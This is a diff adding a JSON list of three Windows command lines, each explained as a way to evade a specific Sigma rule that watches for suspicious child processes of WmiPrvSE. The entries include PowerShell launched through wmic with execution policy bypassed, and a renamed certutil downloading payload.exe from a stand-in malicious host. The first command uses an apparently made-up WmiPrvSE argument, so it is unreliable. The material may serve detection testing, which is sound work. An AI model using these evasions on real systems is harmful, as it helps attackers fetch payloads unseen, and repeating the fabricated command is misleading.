@@ -1,0 +1,14 @@
+[
+  {
+    "output": "C:\\Windows\\System32\\WmiPrvSE.exe -ChildProcess \"C:\\Windows\\System32\\notepad.exe\"",
+    "explanation": "Launches a benign child process (notepad.exe) from WmiPrvSE.exe, bypassing the rule which only checks for specific suspicious child executables."
+  },
+  {
+    "output": "wmic process call create \"powershell.exe -ExecutionPolicy Bypass -Command \\\"Write-Host 'Executed directly'\\\"\"",
+    "explanation": "The Sigma rule checks for 'powershell' in the command line only if the child process is exactly 'cmd.exe' (under selection\\_children\\_2). It completely omits 'powershell.exe' and 'pwsh.exe' from the direct child process list (selection\\_children\\_1). Spawning PowerShell directly via WMI evades this specific detection logic."
+  },
+  {
+    "output": "copy C:\\Windows\\System32\\certutil.exe C:\\Windows\\Temp\\updater.exe && wmic process call create \"C:\\Windows\\Temp\\updater.exe -urlcache -split -f http://malicious.tld/payload.exe C:\\Windows\\Temp\\payload.exe\"",
+    "explanation": "The detection logic relies on exact string matching for the end of the file path (Image|endswith: '\\certutil.exe', etc.). An adversary can bypass this by copying the LOLBin to a new file name before executing it via WMI, circumventing the static image name checks."
+  }
+]
